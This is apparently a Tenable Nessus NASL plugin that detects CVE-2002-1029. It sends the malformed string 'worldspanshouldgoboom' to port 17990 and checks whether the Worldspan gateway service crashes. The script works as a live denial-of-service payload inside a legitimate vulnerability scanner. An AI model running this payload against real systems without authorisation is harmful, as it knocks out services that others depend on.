#
# (C) Tenable Network Security, Inc.
#

# This script was written by Michel Arboi <arboi@alussinan.org>, starting
# from quake3_dos.nasl and a proof of concept code by <altomo@digitalgangsters.net>
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CAN
#
# References:
# From: "altomo" <altomo@digitalgangsters.net>
# To: bugtraq@securityfocus.com
# Subject: Worldspan DoS
# Date: Thu, 4 Jul 2002 15:22:11 -0500
#

include( 'compat.inc' );

if(description)
{
  script_id(11049);
  script_version("$Revision: 1.19 $");
  script_cve_id("CVE-2002-1029");
  script_bugtraq_id(5169);
  script_osvdb_id(14478);

  script_name(english:"Worldspan for Windows Gateway Res Manager Port 17990 Malformed Request DoS");
  script_summary(english:"Wordlspan DoS");

   script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:"It was possible to crash the Worldspan gateway by sending illegal data.

An attacker may use this attack to make this service crash continuously."
  );

  script_set_attribute(
    attribute:'solution',
    value: "This produce was not patched by the vendor, its use should be discontinued."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(
    attribute:'see_also',
    value:'http://seclists.org/bugtraq/2002/Jul/49'
  );

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/07/19");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/07/04");
 script_cvs_date("$Date: 2016/11/29 20:13:38 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
  script_family(english:"Windows");
  script_require_ports(17990);
  exit(0);
}

#
# I suspect that the service will be killed by find_service1.nasl before
# this script can do anything...
#
include("global_settings.inc");
include("misc_func.inc");

port = 17990;
s = 'worldspanshouldgoboom\r';

if (! get_port_state(port)) exit(0);
soc = open_sock_tcp(port);
if (!soc) exit(0);

send(socket:soc, data:s);
close(soc);
# According to the advisory, Worldspan eats CPU and crashes after ~ 1 min
sleep(60);
if (service_is_dead(port: port) > 0)
  security_warning(port);
